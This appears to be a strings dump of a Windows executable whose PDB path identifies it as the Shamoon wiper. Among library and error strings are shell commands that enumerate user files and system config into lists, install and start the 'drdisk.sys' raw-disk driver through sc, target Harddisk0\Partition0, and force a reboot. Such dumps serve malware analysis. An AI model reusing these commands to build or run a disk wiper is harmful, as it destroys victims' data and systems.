[Strings]
nth  paddr      vaddr      len size section type    string
――――――――――――――――――――――――――――――――――――――――――――――――――――――――――
0    0x0000004d 0x0000004d 44  45           ascii   !This program cannot be run in DOS mode.\r\r\n$
1    0x000000a0 0x000000a0 5   7            utf8    Jq#˸\a blocks=Basic Latin,Spacing Modifier Letters
2    0x000000e0 0x000000e0 6   7            ascii   Rich%\a
3    0x000001f8 0x000001f8 5   6            ascii   .text
4    0x0000021f 0x0000021f 7   8            ascii   `.rdata
5    0x00000247 0x00000247 6   7            ascii   @.data
6    0x00000270 0x00000270 5   6            ascii   .rsrc
7    0x00000297 0x00000297 7   8            ascii   @.reloc
1410 0x0001ff5c 0x0042155c 17  18   .rdata  ascii   spanish-guatemala
1411 0x0001ff70 0x00421570 19  20   .rdata  ascii   spanish-el salvador
1412 0x0001ff84 0x00421584 15  16   .rdata  ascii   spanish-ecuador
1413 0x0001ff94 0x00421594 26  27   .rdata  ascii   spanish-dominican republic
1414 0x0001ffb0 0x004215b0 18  19   .rdata  ascii   spanish-costa rica
1415 0x0001ffc4 0x004215c4 16  17   .rdata  ascii   spanish-colombia
1416 0x0001ffd8 0x004215d8 13  14   .rdata  ascii   spanish-chile
1417 0x0001ffe8 0x004215e8 15  16   .rdata  ascii   spanish-bolivia
1418 0x0001fff8 0x004215f8 17  18   .rdata  ascii   spanish-argentina
1419 0x0002000c 0x0042160c 20  21   .rdata  ascii   portuguese-brazilian
1420 0x00020024 0x00421624 17  18   .rdata  ascii   norwegian-nynorsk
1421 0x00020038 0x00421638 16  17   .rdata  ascii   norwegian-bokmal
1422 0x0002004c 0x0042164c 9   10   .rdata  ascii   norwegian
1423 0x00020058 0x00421658 13  14   .rdata  ascii   italian-swiss
1424 0x00020068 0x00421668 13  14   .rdata  ascii   irish-english
1425 0x00020078 0x00421678 12  13   .rdata  ascii   german-swiss
1426 0x00020088 0x00421688 17  18   .rdata  ascii   german-luxembourg
1427 0x0002009c 0x0042169c 19  20   .rdata  ascii   german-lichtenstein
1428 0x000200b0 0x004216b0 15  16   .rdata  ascii   german-austrian
1429 0x000200c0 0x004216c0 12  13   .rdata  ascii   french-swiss
1430 0x000200d0 0x004216d0 17  18   .rdata  ascii   french-luxembourg
1431 0x000200e4 0x004216e4 15  16   .rdata  ascii   french-canadian
1432 0x000200f4 0x004216f4 14  15   .rdata  ascii   french-belgian
1433 0x00020104 0x00421704 11  12   .rdata  ascii   english-usa
1434 0x00020110 0x00421710 10  11   .rdata  ascii   english-us
1435 0x0002011c 0x0042171c 10  11   .rdata  ascii   english-uk
1436 0x00020128 0x00421728 25  26   .rdata  ascii   english-trinidad y tobago
1437 0x00020144 0x00421744 20  21   .rdata  ascii   english-south africa
1438 0x0002015c 0x0042175c 10  11   .rdata  ascii   english-nz
1439 0x00020168 0x00421768 15  16   .rdata  ascii   english-jamaica
1440 0x00020178 0x00421778 11  12   .rdata  ascii   english-ire
1441 0x00020184 0x00421784 17  18   .rdata  ascii   english-caribbean
1442 0x00020198 0x00421798 11  12   .rdata  ascii   english-can
1443 0x000201a4 0x004217a4 14  15   .rdata  ascii   english-belize
1444 0x000201b4 0x004217b4 11  12   .rdata  ascii   english-aus
1445 0x000201c0 0x004217c0 16  17   .rdata  ascii   english-american
1446 0x000201d4 0x004217d4 13  14   .rdata  ascii   dutch-belgian
1447 0x000201e4 0x004217e4 19  20   .rdata  ascii   chinese-traditional
1448 0x000201f8 0x004217f8 17  18   .rdata  ascii   chinese-singapore
1449 0x0002020c 0x0042180c 18  19   .rdata  ascii   chinese-simplified
1450 0x00020220 0x00421820 16  17   .rdata  ascii   chinese-hongkong
1451 0x00020234 0x00421834 7   8    .rdata  ascii   chinese
1452 0x00020244 0x00421844 8   9    .rdata  ascii   canadian
1453 0x00020250 0x00421850 7   8    .rdata  ascii   belgian
1454 0x00020258 0x00421858 10  11   .rdata  ascii   australian
1455 0x00020264 0x00421864 16  17   .rdata  ascii   american-english
1456 0x00020278 0x00421878 16  17   .rdata  ascii   american english
1457 0x0002028c 0x0042188c 8   9    .rdata  ascii   american
1458 0x0002056b 0x00421b6b 4   5    .rdata  ascii   \bOCP
1459 0x00020574 0x00421b74 17  18   .rdata  ascii   Norwegian-Nynorsk
1460 0x00020588 0x00421b88 7   16   .rdata  utf16le CONOUT$
1461 0x000205c4 0x00421bc4 7   8    .rdata  ascii   generic
1462 0x000205e8 0x00421be8 8   9    .rdata  ascii   iostream
1463 0x00020610 0x00421c10 6   7    .rdata  ascii   system
1464 0x00020634 0x00421c34 21  22   .rdata  ascii   iostream stream error
1465 0x000206c4 0x00421cc4 6   28   .rdata  utf32le rwa扲扷扡 blocks=Basic Latin,CJK Unified Ideographs
1466 0x00020700 0x00421d00 5   24   .rdata  utf32le \n!"2*
1467 0x0002071c 0x00421d1c 4   20   .rdata  utf32le \v#3+
1468 0x00020730 0x00421d30 63  64   .rdata  ascii   Visual C++ CRT: Not enough memory to complete call to strerror.
1469 0x00020780 0x00421d80 13  14   .rdata  ascii   bad exception
1470 0x00020790 0x00421d90 21  22   .rdata  ascii   Illegal byte sequence
1471 0x000207a8 0x00421da8 19  20   .rdata  ascii   Directory not empty
1472 0x000207bc 0x00421dbc 24  25   .rdata  ascii   Function not implemented
1473 0x000207d8 0x00421dd8 18  19   .rdata  ascii   No locks available
1474 0x000207ec 0x00421dec 17  18   .rdata  ascii   Filename too long
1475 0x00020800 0x00421e00 25  26   .rdata  ascii   Resource deadlock avoided
1476 0x0002081c 0x00421e1c 16  17   .rdata  ascii   Result too large
1477 0x00020830 0x00421e30 12  13   .rdata  ascii   Domain error
1478 0x00020840 0x00421e40 11  12   .rdata  ascii   Broken pipe
1479 0x0002084c 0x00421e4c 14  15   .rdata  ascii   Too many links
1480 0x0002085c 0x00421e5c 21  22   .rdata  ascii   Read-only file system
1481 0x00020874 0x00421e74 12  13   .rdata  ascii   Invalid seek
1482 0x00020884 0x00421e84 23  24   .rdata  ascii   No space left on device
1483 0x0002089c 0x00421e9c 14  15   .rdata  ascii   File too large
1484 0x000208ac 0x00421eac 35  36   .rdata  ascii   Inappropriate I/O control operation
1485 0x000208d0 0x00421ed0 19  20   .rdata  ascii   Too many open files
1486 0x000208e4 0x00421ee4 29  30   .rdata  ascii   Too many open files in system
1487 0x00020904 0x00421f04 16  17   .rdata  ascii   Invalid argument
1488 0x00020918 0x00421f18 14  15   .rdata  ascii   Is a directory
1489 0x00020928 0x00421f28 15  16   .rdata  ascii   Not a directory
1490 0x00020938 0x00421f38 14  15   .rdata  ascii   No such device
1491 0x00020948 0x00421f48 13  14   .rdata  ascii   Improper link
1492 0x00020958 0x00421f58 11  12   .rdata  ascii   File exists
1493 0x00020964 0x00421f64 15  16   .rdata  ascii   Resource device
1494 0x00020974 0x00421f74 13  14   .rdata  ascii   Unknown error
1495 0x00020984 0x00421f84 11  12   .rdata  ascii   Bad address
1496 0x00020990 0x00421f90 17  18   .rdata  ascii   Permission denied
1497 0x000209a4 0x00421fa4 16  17   .rdata  ascii   Not enough space
1498 0x000209b8 0x00421fb8 32  33   .rdata  ascii   Resource temporarily unavailable
1499 0x000209dc 0x00421fdc 18  19   .rdata  ascii   No child processes
1500 0x000209f0 0x00421ff0 19  20   .rdata  ascii   Bad file descriptor
1501 0x00020a04 0x00422004 17  18   .rdata  ascii   Exec format error
1502 0x00020a18 0x00422018 17  18   .rdata  ascii   Arg list too long
1503 0x00020a2c 0x0042202c 25  26   .rdata  ascii   No such device or address
1504 0x00020a48 0x00422048 18  19   .rdata  ascii   Input/output error
1505 0x00020a5c 0x0042205c 25  26   .rdata  ascii   Interrupted function call
1506 0x00020a78 0x00422078 15  16   .rdata  ascii   No such process
1507 0x00020a88 0x00422088 25  26   .rdata  ascii   No such file or directory
1508 0x00020aa4 0x004220a4 23  24   .rdata  ascii   Operation not permitted
1509 0x00020abc 0x004220bc 8   9    .rdata  ascii   No error
1510 0x00020acc 0x004220cc 5   6    .rdata  ascii   UTF-8
1511 0x00020ad4 0x004220d4 8   9    .rdata  ascii   UTF-16LE
1512 0x00020ae0 0x004220e0 7   8    .rdata  ascii   UNICODE
1513 0x00020af0 0x004220f0 5   12   .rdata  utf16le UTF-8
1514 0x00020afc 0x004220fc 8   18   .rdata  utf16le UTF-16LE
1515 0x00020b10 0x00422110 7   16   .rdata  utf16le UNICODE
1516 0x00020b20 0x00422120 15  16   .rdata  ascii   bad locale name
1517 0x00020b30 0x00422130 20  21   .rdata  ascii   ios_base::badbit set
1518 0x00020b48 0x00422148 21  22   .rdata  ascii   ios_base::failbit set
1519 0x00020b60 0x00422160 20  21   .rdata  ascii   ios_base::eofbit set
1520 0x00020b78 0x00422178 86  87   .rdata  ascii   dir "C:\Documents and Settings\" /s /b /a:-D 2>nul | findstr -i download 2>nul >f1.inf
1521 0x00020bd0 0x004221d0 87  88   .rdata  ascii   dir "C:\Documents and Settings\" /s /b /a:-D 2>nul | findstr -i document 2>nul >>f1.inf
1522 0x00020c28 0x00422228 69  70   .rdata  ascii   dir C:\Users\ /s /b /a:-D 2>nul  | findstr -i download 2>nul >>f1.inf
1523 0x00020c70 0x00422270 69  70   .rdata  ascii   dir C:\Users\ /s /b /a:-D 2>nul  | findstr -i document 2>nul >>f1.inf
1524 0x00020cb8 0x004222b8 68  69   .rdata  ascii   dir C:\Users\ /s /b /a:-D 2>nul  | findstr -i picture 2>nul >>f1.inf
1525 0x00020d00 0x00422300 66  67   .rdata  ascii   dir C:\Users\ /s /b /a:-D 2>nul  | findstr -i video 2>nul >>f1.inf
1526 0x00020d48 0x00422348 66  67   .rdata  ascii   dir C:\Users\ /s /b /a:-D 2>nul  | findstr -i music 2>nul >>f1.inf
1527 0x00020d90 0x00422390 86  87   .rdata  ascii   dir "C:\Documents and Settings\" /s /b /a:-D 2>nul  | findstr -i desktop 2>nul >f2.inf
1528 0x00020de8 0x004223e8 68  69   .rdata  ascii   dir C:\Users\ /s /b /a:-D 2>nul  | findstr -i desktop 2>nul >>f2.inf
1529 0x00020e30 0x00422430 58  59   .rdata  ascii   dir C:\Windows\System32\Drivers /s /b /a:-D 2>nul >>f2.inf
1530 0x00020e70 0x00422470 93  94   .rdata  ascii   dir C:\Windows\System32\Config /s /b /a:-D 2>nul | findstr -v -i systemprofile 2>nul >>f2.inf
1531 0x00020ed0 0x004224d0 31  32   .rdata  ascii   dir f1.inf /s /b 2>nul >>f1.inf
1532 0x00020ef0 0x004224f0 31  32   .rdata  ascii   dir f2.inf /s /b 2>nul >>f1.inf
1533 0x00020f10 0x00422510 6   7    .rdata  ascii   f1.inf
1534 0x00020f18 0x00422518 4   10   .rdata  utf16le \??\
1535 0x00020f24 0x00422524 6   7    .rdata  ascii   f2.inf
1536 0x00020f30 0x00422530 32  66   .rdata  utf16le SYSTEM\CurrentControlSet\Control
1537 0x00020f74 0x00422574 16  34   .rdata  utf16le SystemBootDevice
1538 0x00020f98 0x00422598 16  34   .rdata  utf16le \Device\Harddisk
1539 0x00020fbc 0x004225bc 6   14   .rdata  utf16le rdisk(
1540 0x00020fcc 0x004225cc 10  22   .rdata  utf16le \Partition
1541 0x00020fe4 0x004225e4 10  22   .rdata  utf16le partition(
1542 0x00020ffc 0x004225fc 18  38   .rdata  utf16le FirmwareBootDevice
1543 0x00021024 0x00422624 17  36   .rdata  utf16le \Device\Harddisk0
1544 0x00021048 0x00422648 148 298  .rdata  utf16le 8F71FF7E2831A05D0B88FDAACFAC818E936FCAAA453404180419662BED76E9D70384F056F03ADF3C917CB8C3EE12832F7A7EC3E234BC7FBD0476CFC9F58AC1A1C248DA06E531D133A071
1545 0x00021174 0x00422774 28  58   .rdata  utf16le \Device\Harddisk0\Partition0
1546 0x000211b0 0x004227b0 19  20   .rdata  ascii   shutdown -r -f -t 2
1547 0x000211c4 0x004227c4 10  22   .rdata  utf16le drdisk.sys
1548 0x000211dc 0x004227dc 22  46   .rdata  utf16le %s\System32\Drivers\%s
1549 0x0002120c 0x0042280c 24  25   .rdata  ascii   sc stop drdisk 2>&1 >nul
1550 0x00021228 0x00422828 26  27   .rdata  ascii   sc delete drdisk 2>&1 >nul
1551 0x00021244 0x00422844 7   16   .rdata  utf16le ReadOne
1552 0x00021258 0x00422858 90  91   .rdata  ascii   sc create drdisk type= kernel start= demand binpath= System32\Drivers\drdisk.sys 2>&1 >nul
1553 0x000212b4 0x004228b4 25  26   .rdata  ascii   sc start drdisk 2>&1 >nul
1554 0x000212d0 0x004228d0 30  31   .rdata  ascii   Wow64DisableWow64FsRedirection
1555 0x000212f0 0x004228f0 12  26   .rdata  utf16le kernel32.dll
1556 0x0002130c 0x0042290c 29  30   .rdata  ascii   Wow64RevertWow64FsRedirection
1557 0x0002132c 0x0042292c 17  18   .rdata  ascii   \inf\netfb318.pnf
1558 0x00021340 0x00422940 4   5    .rdata  ascii   %s%s
1559 0x00021348 0x00422948 15  16   .rdata  ascii   string too long
1560 0x00021358 0x00422958 23  24   .rdata  ascii   invalid string position
1561 0x00021370 0x00422970 18  19   .rdata  ascii   vector<T> too long
1562 0x00021384 0x00422984 27  28   .rdata  ascii   invalid map/set<T> iterator
1563 0x000213a0 0x004229a0 8   9    .rdata  ascii   bad cast
1564 0x000213ac 0x004229ac 19  20   .rdata  ascii   map/set<T> too long
1565 0x00021630 0x00422c30 6   7    .rdata  ascii   RSDS\nT
1566 0x00021648 0x00422c48 46  47   .rdata  ascii   C:\Shamoon\ArabianGulf\wiper\release\wiper.pdb
1567 0x00023746 0x00424d46 25  26   .rdata  ascii   InitializeCriticalSection
1568 0x00023762 0x00424d62 9   10   .rdata  ascii   WriteFile
1569 0x0002376e 0x00424d6e 11  12   .rdata  ascii   CloseHandle
1570 0x0002377c 0x00424d7c 12  13   .rdata  ascii   CreateThread
1571 0x0002378c 0x00424d8c 19  20   .rdata  ascii   WaitForSingleObject
1572 0x000237a2 0x00424da2 21  22   .rdata  ascii   DeleteCriticalSection
1573 0x000237ba 0x00424dba 13  14   .rdata  ascii   GetFileSizeEx
1574 0x000237ca 0x00424dca 14  15   .rdata  ascii   SetFilePointer
1575 0x000237dc 0x00424ddc 20  21   .rdata  ascii   EnterCriticalSection
1576 0x000237f4 0x00424df4 13  14   .rdata  ascii   GetSystemTime
1577 0x00023804 0x00424e04 13  14   .rdata  ascii   SetSystemTime
1578 0x00023814 0x00424e14 20  21   .rdata  ascii   LeaveCriticalSection
1579 0x0002382c 0x00424e2c 11  12   .rdata  ascii   CreateFileW
1580 0x0002383a 0x00424e3a 20  21   .rdata  ascii   GetWindowsDirectoryW
1581 0x00023852 0x00424e52 11  12   .rdata  ascii   DeleteFileW
1582 0x00023860 0x00424e60 13  14   .rdata  ascii   FindResourceW
1583 0x00023870 0x00424e70 12  13   .rdata  ascii   LoadResource
1584 0x00023880 0x00424e80 12  13   .rdata  ascii   LockResource
1585 0x00023890 0x00424e90 14  15   .rdata  ascii   SizeofResource
1586 0x000238a2 0x00424ea2 12  13   .rdata  ascii   VirtualAlloc
1587 0x000238b2 0x00424eb2 11  12   .rdata  ascii   VirtualFree
1588 0x000238c0 0x00424ec0 14  15   .rdata  ascii   GetProcAddress
1589 0x000238d2 0x00424ed2 16  17   .rdata  ascii   GetModuleHandleW
1590 0x000238e6 0x00424ee6 20  21   .rdata  ascii   GetWindowsDirectoryA
1591 0x000238fe 0x00424efe 15  16   .rdata  ascii   DeviceIoControl
1592 0x00023910 0x00424f10 12  13   .rdata  ascii   GetLastError
1593 0x00023920 0x00424f20 12  13   .rdata  ascii   SetLastError
1594 0x00023930 0x00424f30 17  18   .rdata  ascii   GetCurrentProcess
1595 0x00023944 0x00424f44 12  13   .rdata  ascii   LoadLibraryW
1596 0x00023954 0x00424f54 5   6    .rdata  ascii   Sleep
1597 0x0002395c 0x00424f5c 18  19   .rdata  ascii   GetExitCodeProcess
1598 0x00023972 0x00424f72 8   9    .rdata  ascii   ReadFile
1599 0x0002397e 0x00424f7e 19  20   .rdata  ascii   MultiByteToWideChar
1600 0x00023992 0x00424f92 12  13   .rdata  ascii   KERNEL32.dll
1601 0x000239a2 0x00424fa2 13  14   .rdata  ascii   RegOpenKeyExW
1602 0x000239b2 0x00424fb2 16  17   .rdata  ascii   RegQueryValueExW
1603 0x000239c6 0x00424fc6 11  12   .rdata  ascii   RegCloseKey
1604 0x000239d2 0x00424fd2 12  13   .rdata  ascii   ADVAPI32.dll
1605 0x000239e2 0x00424fe2 8   9    .rdata  ascii   HeapFree
1606 0x000239ee 0x00424fee 20  21   .rdata  ascii   InterlockedDecrement
1607 0x00023a06 0x00425006 9   10   .rdata  ascii   GetCPInfo
1608 0x00023a12 0x00425012 23  24   .rdata  ascii   GetSystemTimeAsFileTime
1609 0x00023a2c 0x0042502c 13  14   .rdata  ascii   EncodePointer
1610 0x00023a3c 0x0042503c 13  14   .rdata  ascii   DecodePointer
1611 0x00023a4c 0x0042504c 15  16   .rdata  ascii   GetCommandLineW
1612 0x00023a5e 0x0042505e 18  19   .rdata  ascii   HeapSetInformation
1613 0x00023a74 0x00425074 9   10   .rdata  ascii   HeapAlloc
1614 0x00023a80 0x00425080 16  17   .rdata  ascii   TerminateProcess
1615 0x00023a94 0x00425094 24  25   .rdata  ascii   UnhandledExceptionFilter
1616 0x00023ab0 0x004250b0 27  28   .rdata  ascii   SetUnhandledExceptionFilter
1617 0x00023ace 0x004250ce 17  18   .rdata  ascii   IsDebuggerPresent
1618 0x00023ae2 0x004250e2 10  11   .rdata  ascii   HeapCreate
1619 0x00023af0 0x004250f0 25  26   .rdata  ascii   IsProcessorFeaturePresent
1620 0x00023b0c 0x0042510c 14  15   .rdata  ascii   RaiseException
1621 0x00023b1e 0x0042511e 19  20   .rdata  ascii   WideCharToMultiByte
1622 0x00023b34 0x00425134 12  13   .rdata  ascii   LCMapStringW
1623 0x00023b44 0x00425144 14  15   .rdata  ascii   GetStringTypeW
1624 0x00023b56 0x00425156 14  15   .rdata  ascii   GetLocaleInfoW
1625 0x00023b68 0x00425168 20  21   .rdata  ascii   InterlockedIncrement
1626 0x00023b80 0x00425180 8   9    .rdata  ascii   TlsAlloc
1627 0x00023b8c 0x0042518c 11  12   .rdata  ascii   TlsGetValue
1628 0x00023b9a 0x0042519a 11  12   .rdata  ascii   TlsSetValue
1629 0x00023ba8 0x004251a8 7   8    .rdata  ascii   TlsFree
1630 0x00023bb2 0x004251b2 18  19   .rdata  ascii   GetCurrentThreadId
1631 0x00023bc8 0x004251c8 14  15   .rdata  ascii   SetHandleCount
1632 0x00023bda 0x004251da 12  13   .rdata  ascii   GetStdHandle
1633 0x00023bea 0x004251ea 37  38   .rdata  ascii   InitializeCriticalSectionAndSpinCount
1634 0x00023c12 0x00425212 11  12   .rdata  ascii   GetFileType
1635 0x00023c20 0x00425220 15  16   .rdata  ascii   GetStartupInfoW
1636 0x00023c32 0x00425232 8   9    .rdata  ascii   HeapSize
1637 0x00023c3e 0x0042523e 11  12   .rdata  ascii   ExitProcess
1638 0x00023c4c 0x0042524c 18  19   .rdata  ascii   GetFileAttributesA
1639 0x00023c62 0x00425262 12  13   .rdata  ascii   GetConsoleCP
1640 0x00023c72 0x00425272 14  15   .rdata  ascii   GetConsoleMode
1641 0x00023c84 0x00425284 16  17   .rdata  ascii   FlushFileBuffers
1642 0x00023c98 0x00425298 18  19   .rdata  ascii   GetModuleFileNameW
1643 0x00023cae 0x004252ae 23  24   .rdata  ascii   FreeEnvironmentStringsW
1644 0x00023cc8 0x004252c8 22  23   .rdata  ascii   GetEnvironmentStringsW
1645 0x00023ce2 0x004252e2 23  24   .rdata  ascii   QueryPerformanceCounter
1646 0x00023cfc 0x004252fc 12  13   .rdata  ascii   GetTickCount
1647 0x00023d0c 0x0042530c 19  20   .rdata  ascii   GetCurrentProcessId
1648 0x00023d22 0x00425322 6   7    .rdata  ascii   GetACP
1649 0x00023d2c 0x0042532c 8   9    .rdata  ascii   GetOEMCP
1650 0x00023d38 0x00425338 15  16   .rdata  ascii   IsValidCodePage
1651 0x00023d4a 0x0042534a 9   10   .rdata  ascii   RtlUnwind
1652 0x00023d56 0x00425356 11  12   .rdata  ascii   HeapReAlloc
1653 0x00023d64 0x00425364 19  20   .rdata  ascii   InterlockedExchange
1654 0x00023d7a 0x0042537a 14  15   .rdata  ascii   CreateProcessA
1655 0x00023d8c 0x0042538c 13  14   .rdata  ascii   WriteConsoleW
1656 0x00023d9c 0x0042539c 12  13   .rdata  ascii   SetStdHandle
1657 0x00023dac 0x004253ac 18  19   .rdata  ascii   GetUserDefaultLCID
1658 0x00023dc2 0x004253c2 14  15   .rdata  ascii   GetLocaleInfoA
1659 0x00023dd4 0x004253d4 18  19   .rdata  ascii   EnumSystemLocalesA
1660 0x00023dea 0x004253ea 13  14   .rdata  ascii   IsValidLocale
1661 0x00023dfa 0x004253fa 14  15   .rdata  ascii   CompareStringW
1662 0x00023e0c 0x0042540c 23  24   .rdata  ascii   SetEnvironmentVariableA
1663 0x00023e26 0x00425426 26  27   .rdata  ascii   InterlockedCompareExchange
1664 0x00023e44 0x00425444 11  12   .rdata  ascii   CreateFileA
1665 0x00023e52 0x00425452 12  13   .rdata  ascii   SetEndOfFile
1666 0x00023e62 0x00425462 14  15   .rdata  ascii   GetProcessHeap
1667 0x00024018 0x00426018 15  16   .data   ascii   .?AVtype_info@@
1668 0x000242ec 0x004262ec 12  52   .data   utf32le \t\a\f\b\f\t\f\n\a\v\b\f
1669 0x00024370 0x00426370 5   24   .data   utf32le R\rS\rW
1670 0x00024388 0x00426388 7   32   .data   utf32le Y\vl\rm p
1671 0x000243fc 0x004263fc 4   20   .data   utf32le \v§\r· blocks=Basic Latin,Latin-1 Supplement
1672 0x00024896 0x00426896 26  27   .data   ascii                             
1673 0x00024976 0x00426976 26  27   .data   ascii   abcdefghijklmnopqrstuvwxyz
1674 0x00024996 0x00426996 26  27   .data   ascii   ABCDEFGHIJKLMNOPQRSTUVWXYZ
1675 0x00024a9a 0x00426a9a 26  27   .data   ascii                             
1676 0x00024b81 0x00426b81 26  27   .data   ascii   abcdefghijklmnopqrstuvwxyz
1677 0x00024ba1 0x00426ba1 26  27   .data   ascii   ABCDEFGHIJKLMNOPQRSTUVWXYZ
1678 0x00024f2c 0x00426f2c 24  25   .data   ascii   .?AV_Locimp@locale@std@@
1679 0x00024f50 0x00426f50 24  25   .data   ascii   .?AVerror_category@std@@
1680 0x00024f74 0x00426f74 33  34   .data   ascii   .?AV_Generic_error_category@std@@
1681 0x00024fa0 0x00426fa0 34  35   .data   ascii   .?AV_Iostream_error_category@std@@
1682 0x00024fcc 0x00426fcc 32  33   .data   ascii   .?AV_System_error_category@std@@
1683 0x00025018 0x00427018 21  22   .data   ascii   .?AVlogic_error@std@@
1684 0x00025038 0x00427038 22  23   .data   ascii   .?AVlength_error@std@@
1685 0x00025058 0x00427058 22  23   .data   ascii   .?AVout_of_range@std@@
1686 0x00025078 0x00427078 90  91   .data   ascii   Copyright (c) 1992-2004 by P.J. Plauger, licensed by Dinkumware, Ltd. ALL RIGHTS RESERVED.
1687 0x000250dc 0x004270dc 23  24   .data   ascii   .?AVbad_exception@std@@
1688 0x000251bc 0x004271bc 23  24   .data   ascii   .?AV?$codecvt@DDH@std@@
1689 0x000251dc 0x004271dc 20  21   .data   ascii   .?AV?$ctype@_W@std@@
1690 0x000251fc 0x004271fc 19  20   .data   ascii   .?AV?$ctype@D@std@@
1691 0x00025218 0x00427218 20  21   .data   ascii   .?AUctype_base@std@@
1692 0x00025238 0x00427238 24  25   .data   ascii   .?AV?$codecvt@_WDH@std@@
1693 0x0002525c 0x0042725c 22  23   .data   ascii   .?AVcodecvt_base@std@@
1694 0x0002527c 0x0042727c 22  23   .data   ascii   .?AVfacet@locale@std@@
1695 0x0002529c 0x0042729c 51  52   .data   ascii   .?AV?$basic_fstream@_WU?$char_traits@_W@std@@@std@@
1696 0x000252d8 0x004272d8 51  52   .data   ascii   .?AV?$basic_filebuf@_WU?$char_traits@_W@std@@@std@@
1697 0x00025314 0x00427314 52  53   .data   ascii   .?AV?$basic_iostream@_WU?$char_traits@_W@std@@@std@@
1698 0x00025354 0x00427354 51  52   .data   ascii   .?AV?$basic_ostream@_WU?$char_traits@_W@std@@@std@@
1699 0x00025390 0x00427390 51  52   .data   ascii   .?AV?$basic_istream@_WU?$char_traits@_W@std@@@std@@
1700 0x000253cc 0x004273cc 53  54   .data   ascii   .?AV?$basic_streambuf@_WU?$char_traits@_W@std@@@std@@
1701 0x0002540c 0x0042740c 47  48   .data   ascii   .?AV?$basic_ios@_WU?$char_traits@_W@std@@@std@@
1702 0x00025444 0x00427444 49  50   .data   ascii   .?AV?$basic_fstream@DU?$char_traits@D@std@@@std@@
1703 0x00025480 0x00427480 49  50   .data   ascii   .?AV?$basic_filebuf@DU?$char_traits@D@std@@@std@@
1704 0x000254bc 0x004274bc 50  51   .data   ascii   .?AV?$basic_iostream@DU?$char_traits@D@std@@@std@@
1705 0x000254f8 0x004274f8 49  50   .data   ascii   .?AV?$basic_ostream@DU?$char_traits@D@std@@@std@@
1706 0x00025534 0x00427534 49  50   .data   ascii   .?AV?$basic_istream@DU?$char_traits@D@std@@@std@@
1707 0x00025570 0x00427570 51  52   .data   ascii   .?AV?$basic_streambuf@DU?$char_traits@D@std@@@std@@
1708 0x000255ac 0x004275ac 45  46   .data   ascii   .?AV?$basic_ios@DU?$char_traits@D@std@@@std@@
1709 0x000255e4 0x004275e4 19  20   .data   ascii   .?AV?$_Iosb@H@std@@
1710 0x00025600 0x00427600 18  19   .data   ascii   .?AVios_base@std@@
1711 0x00025626 0x00427626 4   5    .data   ascii   JFIF
1712 0x00025649 0x00427649 5   6    .data   ascii   \n\n\t\t\n
1713 0x00025665 0x00427665 9   10   .data   ascii    , #&')*)
1714 0x00025670 0x00427670 9   10   .data   ascii   -0-(0%()(
1715 0x0002567e 0x0042767e 6   7    .data   ascii   \a\a\a\n\b\n
1716 0x0002568c 0x0042768c 50  51   .data   ascii   ((((((((((((((((((((((((((((((((((((((((((((((((((
1717 0x00025711 0x00427711 5   6    .data   ascii   "Qa\aq
1718 0x0002582d 0x0042782d 7   8    .data   ascii   4;]KT[+
1719 0x0002584d 0x0042784d 6   8    .data   utf8    z&xCܔ] blocks=Basic Latin,Syriac
1720 0x0002589e 0x0042789e 5   7    .data   utf8    \f\nwBݾ blocks=Basic Latin,Arabic Supplement
1721 0x000258b1 0x004278b1 4   7    .data   utf8    [z㏆~ blocks=Basic Latin,CJK Compatibility
1722 0x00025958 0x00427958 5   6    .data   ascii   c$yoU
1723 0x00025995 0x00427995 5   6    .data   ascii   N*ZL+
1724 0x000259a6 0x004279a6 4   6    .data   utf8    THг1 blocks=Basic Latin,Cyrillic
1725 0x000259ad 0x004279ad 5   6    .data   ascii   nM\v8@
1726 0x000259d7 0x004279d7 4   5    .data   ascii   \v8\2
1727 0x000259ff 0x004279ff 7   10   .data   utf8    9Ͳ$N{v· blocks=Basic Latin,Greek and Coptic,Latin-1 Supplement
1728 0x00025a15 0x00427a15 4   5    .data   ascii   hV:}
1729 0x00025a3c 0x00427a3c 23  24   .data   ascii   .?AVruntime_error@std@@
1730 0x00025a5c 0x00427a5c 19  20   .data   ascii   .?AVexception@std@@
1731 0x00025a78 0x00427a78 26  27   .data   ascii   .?AVfailure@ios_base@std@@
1732 0x00025a9c 0x00427a9c 22  23   .data   ascii   .?AVsystem_error@std@@
1733 0x00025abc 0x00427abc 18  19   .data   ascii   .?AVbad_cast@std@@
1734 0x00025ad8 0x00427ad8 19  20   .data   ascii   .?AVbad_alloc@std@@
1735 0x00025ca0 0x0042a0a0 8   17   .rsrc   utf16le \aREADONE
1736 0x00025cf5 0x0042a0f5 4   5    .rsrc   ascii   \e[=4
